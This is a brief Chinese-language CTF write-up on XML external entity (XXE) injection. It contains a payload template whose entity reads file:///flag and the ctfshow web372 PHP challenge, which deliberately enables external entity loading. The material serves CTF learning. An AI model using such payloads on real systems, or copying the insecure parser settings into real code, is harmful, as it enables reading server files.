# XML 注入
## 模板

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ELEMENT root (ctfshow)>
    <!ELEMENT ctfshow ANY>
    <!ENTITY payload SYSTEM "file:///flag">
]>
<root>
    <ctfshow>&payload;</ctfshow>
</root>
```
DTD 可以定义 XML 文件的标签格式，也可以定义一个实体来访问文件

## 例题 ctfshow web372
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-01-07 12:59:52
# @Last Modified by:   h1xa
# @Last Modified time: 2021-01-07 13:36:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $ctfshow = $creds->ctfshow;
    echo $ctfshow;
}
highlight_file(__FILE__);
```

启用可以使用外部实体。
```php
libxml_disable_entity_loader(false);
```



注意，在这道题中根节点是必要的。根据本地调试，可发现 `$creds` 为：
```
SimpleXMLElement Object
(
    [ctfshow] => SimpleXMLElement Object
        (
        )
)
```